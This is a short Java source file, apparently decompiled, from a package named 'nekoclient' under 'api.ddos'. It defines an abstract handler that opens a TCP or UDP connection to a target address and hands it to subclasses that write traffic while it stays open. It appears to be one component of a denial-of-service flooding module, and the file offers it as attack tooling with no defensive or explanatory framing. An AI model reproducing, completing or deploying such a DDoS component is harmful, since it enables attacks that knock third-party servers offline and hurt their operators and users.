package dev.neko.nekoclient.api.ddos.impl.handler;

import dev.neko.nekoclient.api.ddos.Protocol;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.channels.ByteChannel;
import java.nio.channels.DatagramChannel;
import java.nio.channels.SocketChannel;
import java.util.function.Supplier;

public abstract class WriteMethodHandler implements MethodHandler {
   public abstract void handle(ByteChannel var1, Supplier<Boolean> var2) throws IOException;

   @Override
   public void run(Protocol protocol, InetSocketAddress address) throws IOException {
      switch(protocol) {
         case TCP:
            SocketChannel socketChannel = SocketChannel.open();
            socketChannel.socket().setSoTimeout(20000);
            socketChannel.connect(address);
            if (socketChannel.finishConnect()) {
               this.handle(socketChannel, socketChannel::isConnected);
            }
            break;
         case UDP:
            DatagramChannel datagramChannel = DatagramChannel.open();
            datagramChannel.socket().setSoTimeout(20000);
            datagramChannel.connect(address);
            this.handle(datagramChannel, datagramChannel::isConnected);
      }
   }

   @Override
   public void cleanup() {
   }
}
